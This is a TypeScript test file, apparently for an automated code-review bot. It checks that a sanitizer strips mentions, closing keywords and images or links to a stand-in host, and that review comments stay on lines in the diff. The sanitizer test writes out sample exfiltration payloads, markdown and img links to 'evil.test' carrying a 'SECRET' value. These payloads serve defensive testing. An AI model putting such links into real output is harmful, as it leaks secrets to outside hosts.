import { describe, expect, test } from "bun:test";
import { validateReview } from "../scripts/lib/review";
import { sanitize } from "../scripts/lib/sanitize";

describe("sanitize", () => {
  test("mentions do not ping anyone", () => {
    expect(sanitize("thanks @octocat and @org/team")).not.toMatch(/@octocat|@org/);
    expect(sanitize("email me at a@b.com")).toContain("a@b.com");
  });

  test("images and foreign links cannot carry data out", () => {
    const out = sanitize("![x](https://evil.test/p?k=SECRET) <img src=https://evil.test/a> [docs](https://evil.test/?d=1) https://evil.test/x");
    expect(out).not.toContain("evil.test");
    expect(out).not.toContain("<img");
  });

  test("GitHub links and safe tags survive", () => {
    const out = sanitize("<details><summary>Log</summary>ok</details> see https://github.com/a/b/issues/1");
    expect(out).toContain("<details><summary>Log</summary>");
    expect(out).toContain("https://github.com/a/b/issues/1");
  });

  test("closing keywords cannot close other issues", () => {
    expect(sanitize("Fixes #12 and closes other/repo#3")).not.toMatch(/Fixes #12|closes other\/repo#3/);
  });
});

describe("validateReview", () => {
  const diff = [
    "diff --git a/src/a.ts b/src/a.ts",
    "--- a/src/a.ts",
    "+++ b/src/a.ts",
    "@@ -10,3 +10,4 @@ fn",
    " keep",
    "-old",
    "+new",
    "+added",
    " tail",
  ].join("\n");

  test("inline comments must point at lines in the diff", () => {
    const review = validateReview(
      {
        summary: "Looks fine",
        comments: [
          { path: "src/a.ts", line: 11, body: "check this" },
          { path: "src/a.ts", line: 99, body: "far away" },
          { path: "other.ts", line: 1, body: "not in diff" },
        ],
      },
      diff,
    );
    expect(review.comments).toEqual([{ path: "src/a.ts", line: 11, body: "check this" }]);
    expect(review.summary).toContain("far away");
    expect(review.summary).toContain("not in diff");
  });
});
